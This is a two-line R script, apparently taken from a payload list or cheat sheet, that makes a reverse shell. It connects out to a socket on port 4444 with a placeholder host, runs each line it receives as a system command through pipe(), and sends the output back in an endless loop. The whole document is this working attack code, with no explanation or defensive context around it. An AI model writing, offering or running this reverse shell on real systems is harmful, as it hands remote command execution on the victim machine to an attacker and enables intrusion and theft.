s<-socketConnection(host='0.0.0.0',port=4444,blocking=TRUE,server=FALSE,open='r+');
while(TRUE){writeLines(readLines(pipe(readLines(s, 1))),s)}